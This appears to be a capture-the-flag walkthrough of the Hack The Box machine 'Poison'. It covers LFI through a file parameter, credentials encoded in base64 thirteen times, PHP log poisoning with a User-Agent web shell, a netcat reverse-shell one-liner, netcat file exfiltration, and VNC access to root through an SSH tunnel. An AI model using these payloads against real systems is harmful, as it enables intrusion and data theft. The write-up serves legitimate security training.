Poison is a medium rated Linux box. This box starts off by having two ports open: 22 (SSH) and 80 (HTTP). There were two vectors to get an initial shell on the host which is encoded credentials achieved via LFI in the `file` parameter of `browse.php` to view `/etc/passwd` for users on the host, and a file shown on `listfiles.php` which contained the encoded credential and led to me being able to use a user on the host and the password from the file called `pwdbackup.txt` to log in via SSH. The other way is via `PHP Log Poisoning` which will get us a user as `www` which will be the second vector I look into in this blog post. Using the SSH session I got, there was a `secret.zip` that I exfiltrated off the box onto my host. The zip was password protected, but had credential reuse from the `pwdbackup.txt` and was able to retrieve a `secret` file. The `secret` file gave us access to a VNC session as root which needed to be local port forwarded to our host to be able to access it. With the overview out of the way, let's jump into the box.
# TCP Nmap Scan
```lua
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)  
| ssh-hostkey:  
| 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)  
| 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)  
|_ 256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)  
80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)  
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32  
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).  
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```
# 80 - HTTP
Looking at the website we see it is running `PHP` (most likely some sort of `Apache` web server). It allows us to list some of the files that are presented where it says "Sites to be tested".
  <img src="{{ site.github.url }}/images/htb/poison/Pasted image 20230324032159.png" />

Looking at one of the files such as `listfiles.php` shows an array of files. One of them being a `pwdbackup.txt` file. 
  <img src="{{ site.github.url }}/images/htb/poison/Pasted image 20230324042256.png" />
Browsing to it showed the following:
  <img src="{{ site.github.url }}/images/htb/poison/Pasted image 20230324041720.png" />
```shell
Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=
```
# Shell as charix
Looking at this string of text, it looks to be Base64 encoded. Usually Base64 encoding scheme is a bit easier to identify as the `+`, `/`, and `=` symbols are special suffix codes + the upper/lower Roman alphabet + numerals for Base64 and can usually be a good indicator of what you're working with. Seeing that on the top they mentioned it was encoded 13 times... let's try it 13 times. 
  <img src="{{ site.github.url }}/images/htb/poison/Pasted image 20230324041401.png" />
I probably did this in one of the most ineffective ways in terms of time, but basically I stuck this output into [CyberChef](https://gchq.github.io/CyberChef/) and would get the output of the Base64 and would stick it back into the input until I was left with just a string of `Charix!2#4%6&8(0`. This looks like some sort of password so we'll keep that in mind for later. Since we don't have a username though this is a bit difficult to use. Looking at the parameter for the `browse.php` file, we have something called `file`. The `file` parameter seems to be grabbing a file on disk. Typically when I see parameters grabbing files, I like to go and test for Local File Inclusion ("LFI") which is an attack vector in which we can traverse out of the intended directory we are supposed to be grabbing files from and access files outside of that. Something that I like to look at is `/etc/passwd` to see what users are on the host. The way we can traverse out of the directory is by simply appending a bunch of `../`s and then the file you want to access. We do this so we can hit the root of the file system and then work out way back up since we don't really know where our current directory is when performing the LFI unless we find information about where we are.
  <img src="{{ site.github.url }}/images/htb/poison/Pasted image 20230324032648.png" />
And we find a user named `charix`! We can test if we can use this user alongside the credentials we got earlier to log in via SSH:
```shell
```shell
ssh charix@10.10.10.84
The authenticity of host '10.10.10.84 (10.10.10.84)' can't be established.
ED25519 key fingerprint is SHA256:ai75ITo2ASaXyYZVscbEWVbDkh/ev+ClcQsgC6xmlrA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.84' (ED25519) to the list of known hosts.

(charix@10.10.10.84) Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
nc(1) (or netcat) is useful not only for redirecting input/output to
TCP or UDP connections, but also for proxying them with inetd(8).
csh: The terminal database could not be opened.
csh: using dumb terminal settings.
charix@Poison:~ %
```
And it works!
# shell as www
Looking at the name of the box I was wondering why it was named Poison. I was just looking up some of the technology stack that I was working with on Google followed by "poison" and saw there is a PHP Log Poisoning attack. Something that made me think that this me another path to get a shell is the name of the box (of course), and two because this attack is done in conjunction with LFI. Essentially what Log Poisoning is, is it is a technique that allows one to tamper with a log file and insert malicious code (i.e. PHP commands) within the log file which will be interpreted by the programming language as code to execute, giving the ability to have remote code execution. So first things first is to find where the log file is on disk. I did some digging and searched on Google for the path of the access logs for FreeBSD as that is what we're working with on this box. They mentioned it possibly being in `/var/log/httpd-access.log` and it was!
  <img src="{{ site.github.url }}/images/htb/poison/Pasted image 20230324040050.png" />
Something interesting you might see is the `User-Agent` which is a HTTP header to characterize to the web server what type of Operating System, Web Application, etc. you might be using. We can actually go and change this and insert malicious code (in this case the `<?php system($_GET['cmd']); ?>`) snippet which will allow us to use `cmd` as a parameter to input commands into for this file. So the log file will interpret this as legitimate code within the log file and give us the ability to do remote code execution. As a proof of concept, I ran the following within Burp Suite.
  <img src="{{ site.github.url }}/images/htb/poison/Pasted image 20230324040119.png" />
We can see from the response of the request I sent, we can see a list of files from running `ls`. From here we can utilize this and get a reverse shell by using this payload and URL encoding it:
```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.8 9001 >/tmp/f
```
  <img src="{{ site.github.url }}/images/htb/poison/Pasted image 20230324040551.png" />
I set up a netcat listener on port 9001 and get a shell as `www`.
```shell
┌──(root㉿commando)-[/mnt/c/Users/bri5ee/Documents/htb/poison]
└─# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.84] 49584
sh: can't access tty; job control turned off
$
```
However, from here it seems like we need to user `charix` that we got earlier so we'll be continuing from that prospective to get root.

# Shell as root 
Looking in `charix`'s home directory, we see a `secret.zip` file. The `.zip` file was password protected so I needed to get it off the compromised host and onto my localhost.
```shell
charix@Poison:~ % ls -lah
total 48
drwxr-x---  2 charix  charix   512B Mar 19  2018 .
drwxr-xr-x  3 root    wheel    512B Mar 19  2018 ..
-rw-r-----  1 charix  charix   1.0K Mar 19  2018 .cshrc
-rw-rw----  1 charix  charix     0B Mar 19  2018 .history
-rw-r-----  1 charix  charix   254B Mar 19  2018 .login
-rw-r-----  1 charix  charix   163B Mar 19  2018 .login_conf
-rw-r-----  1 charix  charix   379B Mar 19  2018 .mail_aliases
-rw-r-----  1 charix  charix   336B Mar 19  2018 .mailrc
-rw-r-----  1 charix  charix   802B Mar 19  2018 .profile
-rw-r-----  1 charix  charix   281B Mar 19  2018 .rhosts
-rw-r-----  1 charix  charix   849B Mar 19  2018 .shrc
-rw-r-----  1 root    charix   166B Mar 19  2018 secret.zip
-rw-r-----  1 root    charix    33B Mar 19  2018 user.txt
```
A good way to do that is by utilizing netcat like so:
```shell
# On the compromised host:
charix@Poison:~ % cat secret.zip | nc 10.10.14.8 1234

# On your local host
┌──(root㉿commando)-[/mnt/c/Users/bri5ee/Documents/htb/poison]
└─# nc -l -p 1234 > secret.zip
```
This will transfer the contents of `secret.zip` over netcat to your IP and port that you are listening on and direct it to a file called `secret.zip`. We can validate this by checking the MD5/SHA256 hash of it, but for me I just ran `file` against it to see if it interpreted as a `zip` file.
```shell
┌──(root㉿commando)-[/mnt/c/Users/bri5ee/Documents/htb/poison]
└─# file secret.zip
secret.zip: Zip archive data, at least v2.0 to extract, compression method=store
```
And it is! So the data exfiltration worked. Immediately I thought of using `zip2john` which is a tool that would allow us to test a bunch of passwords against this `.zip` file. However, why don't we just try the password we got from earlier:
```shell
┌──(root㉿commando)-[/mnt/c/Users/bri5ee/Documents/htb/poison]
└─# unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password:
 extracting: secret
```
And... it worked. So the file that came out of it was named `secret`. Running `file` against it, I still have no idea about what it's doing or what it is. However, I decided to take a deeper look into things being hosted on the compromised host and saw `VNC` is running. Virtual Network Computing ("VNC") is a protocol that is used for graphical desktop-sharing, similar to the Remote Desktop Protocol ("RDP") you'd typically see in Windows environments.
```shell
charix@Poison:~ % sockstat -4l
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS
www      httpd      768   4  tcp4   *:80                  *:*
www      httpd      765   4  tcp4   *:80                  *:*
root     sendmail   702   3  tcp4   127.0.0.1:25          *:*
www      httpd      686   4  tcp4   *:80                  *:*
www      httpd      685   4  tcp4   *:80                  *:*
www      httpd      684   4  tcp4   *:80                  *:*
www      httpd      683   4  tcp4   *:80                  *:*
www      httpd      682   4  tcp4   *:80                  *:*
root     httpd      670   4  tcp4   *:80                  *:*
root     sshd       620   4  tcp4   *:22                  *:*
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    390   7  udp4   *:514                 *:*
```
I did some research and found that you can actually use a file with vnc that is used as a mechanism to authenticate to the protocol. It might possibly be that `secret` file we saw earlier. However, since VNC is being hosted locally on the host identifiable by seeing the local address being `127.0.0.1:5901` and `127.0.0.1:5801`, we need to find a way to access this port from our host since we need to use a tool such as `vncviewer` to access it. This is where local port forwarding can come into play, and thankfully SSH has built in functionality already to do that. `Local port forwarding` is a way to forward a port on your local host (the SSH client) onto a port of the remote host (the SSH server) which will be the compromised host in our case. Then it will go and get forwarded to a port on the destination machine. Essentially this is used when we want to be accessible the host to our host. If we wanted to do the opposite and having something from our host be accessible to the compromised host, you could do this with `remote port forwarding`. But in this case, we'll just stick with `local port forwarding` to do this with SSH, we use the following command:
```shell
ssh -L [LOCAL_IP:]LOCAL_PORT:DESTINATION_IP:DESTINATION_PORT user@ssh_server_ip
```
Let's break this down a little bit:
- `[LOCAL_IP:]LOCAL_PORT` - You can specify the local IP (optional) and the local port here. This is where the service you are trying to have accessible from the remote host will be hosted on locally to you. 
- `DESTINATION_IP.` - This is the IP of the remote host you are trying to access.
- `DESTINATION_PORT` - This is the port that you are trying to access from the remote port.
- `user@ssh_server_ip` - This is where you'll simply type the username and server's IP you are trying to access via SSH.
So in our case it'll look a little something like this:
```shell
ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
```
So now on port `5901` on our host will be what is being hosted on `10.10.10.84:5901`. 
```shell
┌──(root㉿commando)-[/mnt/c/Users/bri5ee/Documents/htb/poison]
└─# ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
(charix@10.10.10.84) Password for charix@Poison:
(charix@10.10.10.84) Password for charix@Poison:
Last login: Fri Mar 24 12:33:43 2023 from 10.10.14.8
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
"man firewall" will give advice for building a FreeBSD firewall
                -- David Scheidt <dscheidt@tumbolia.com>
csh: The terminal database could not be opened.
csh: using dumb terminal settings.
charix@Poison:~ %
```
I go ahead and open up `vncviewer` and use the `-passwd` flag to pass the file `secret` over to see if I can authenticate into VNC.
  <img src="{{ site.github.url }}/images/htb/poison/Pasted image 20230324051634.png" />
Note that it's using `127.0.0.1:5901` and not `10.10.10.84:5901`. Again, this is because we are using local port forwarding so we can access that port locally on our host from the remote host. After hitting "Connect" we see we got a shell as root!
  <img src="{{ site.github.url }}/images/htb/poison/Pasted image 20230324051649.png" />
